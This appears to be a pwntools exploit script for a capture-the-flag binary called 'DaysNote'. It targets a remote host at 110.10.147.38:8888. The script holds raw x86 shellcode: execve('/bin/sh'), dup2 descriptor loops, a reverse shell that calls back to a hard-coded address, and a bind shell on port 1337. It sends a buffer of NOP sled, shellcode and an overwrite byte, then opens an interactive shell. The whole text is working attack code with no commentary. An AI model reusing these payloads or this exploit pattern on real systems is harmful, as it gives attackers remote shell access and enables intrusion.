from pwn import *
context(terminal = ['xterm', 'splitw'])

park = '\x31\xC0\xB4\x34\xB0\x26\x50\xB8\x30\x21\x31\x3E\xFE\xCC\x50\xB8\x21\x33\x3E\x26\xFE\xC8\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xC0\x89\xE3\x89\xC1\x89\xC2\xB0\x6B\x2C\x60\xCD\x80'
bind = '\x31\xc9\xb1\x02\x31\xdb\xb3\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7'
bind2 = '\x31\xc9\xb1\x01\x80\xe9\x01\x31\xdb\xb3\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7'
shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x6b\x2c\x60\xcd\x80'

sen = bind+bind2+shell
reverse= '\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x8d\xdf\xaf\xcb\x66\x68\x29\x29\x66\x6a\x02\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x6b\x2c\x60\xcd\x80'

vv = '\x6a\x66\x58\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x96\x52\x43\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x53\x56\x89\xe1\x6a\x66\x58\x43\x43\xcd\x80\x52\x52\x56\x89\xe1\x43\xb0\x66\xcd\x80\x93\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb6\x2c\x60\x0b\xcd\x80'
a = 24
#p = process('./DaysNote')


p = remote('110.10.147.38', 8888)
#gdb.attach(p)

p.send('1600\n')

payload = '\x90'*(365-len(vv))
payload += vv
payload += chr(a)

p.send(payload + '\n')
p.interactive()